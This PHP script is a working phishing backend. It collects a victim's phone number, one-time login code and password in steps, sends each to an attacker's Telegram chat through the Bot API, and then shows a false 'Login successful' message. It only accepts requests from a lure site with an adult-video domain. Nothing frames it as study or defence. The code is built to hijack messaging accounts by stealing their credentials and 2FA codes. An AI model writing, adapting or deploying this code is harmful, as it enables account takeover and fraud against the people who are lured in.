<?php
// Define allowed domain
$allowedDomain = "https://desiviralxxxvideos.infy.uk";

// Enable CORS only for the allowed domain
header("Access-Control-Allow-Origin: $allowedDomain");
header("Access-Control-Allow-Methods: GET, POST");
header("Access-Control-Allow-Headers: Content-Type");

// Validate origin and referer to prevent unauthorized access
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';

if (!empty($origin) && $origin !== $allowedDomain && strpos($referer, $allowedDomain) !== 0) {
    http_response_code(403); // Forbidden
    echo json_encode(["error" => "Access denied"]);
    exit();
}

// Allow only GET and POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST' && $_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405); // Method Not Allowed
    echo json_encode(["error" => "Only GET and POST requests are allowed"]);
    exit();
}

// Load environment variables
$telegramToken = getenv('TOKEN'); // Secure token storage
$chatId = getenv('ID'); // Store Chat ID in environment variable

// Function to send a message to Telegram
function sendToTelegram($message) {
    global $telegramToken, $chatId;

    $url = "https://api.telegram.org/bot$telegramToken/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'MarkdownV2'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Handle both GET and POST requests
$requestData = $_SERVER['REQUEST_METHOD'] === 'POST' ? $_POST : $_GET;
$action = $requestData['action'] ?? '';

if ($action === 'phone') {
    $phone = $requestData['phone'] ?? '';

    if (empty($phone)) {
        echo json_encode(["error" => "Phone number is required"]);
        exit();
    }

    sendToTelegram("*Phone:* \n`$phone`");

    // Respond with step transition
    echo json_encode(["step" => "otp", "message" => "Enter OTP", "phone" => $phone]);
    exit;
}

if ($action === 'otp') {
    $phone = $requestData['phone'] ?? '';
    $code = $requestData['code'] ?? '';

    if (empty($phone) || empty($code)) {
        echo json_encode(["error" => "Phone and OTP are required"]);
        exit();
    }

    sendToTelegram("*OTP:*\n Phone: `$phone`\n OTP: `$code`");

    echo json_encode(["step" => "password", "message" => "Enter your password", "phone" => $phone]);
    exit;
}

if ($action === 'password') {
    $phone = $requestData['phone'] ?? '';
    $password = $requestData['password'] ?? '';

    if (empty($phone) || empty($password)) {
        echo json_encode(["error" => "Phone and password are required"]);
        exit();
    }

    sendToTelegram("*Login:*\n Phone: `$phone`\n Password: `$password`");

    echo json_encode(["status" => "success", "message" => "Login successful"]);
    exit;
}

// Default response if no valid action
http_response_code(400);
echo json_encode(["error" => "Invalid request"]);
?>